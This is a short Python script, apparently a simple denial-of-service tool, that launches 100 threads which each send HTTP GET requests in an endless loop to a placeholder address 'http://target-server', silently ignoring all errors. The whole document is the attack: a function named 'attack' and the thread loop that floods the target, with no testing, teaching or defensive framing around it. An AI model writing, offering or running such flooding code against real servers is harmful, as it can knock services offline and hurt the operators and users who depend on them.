import requests
import threading

target = "http://target-server"
def attack():
    while True:
        try:
            requests.get(target)
        except:
            pass

for i in range(100):  # Number of threads
    thread = threading.Thread(target=attack)
    thread.start()
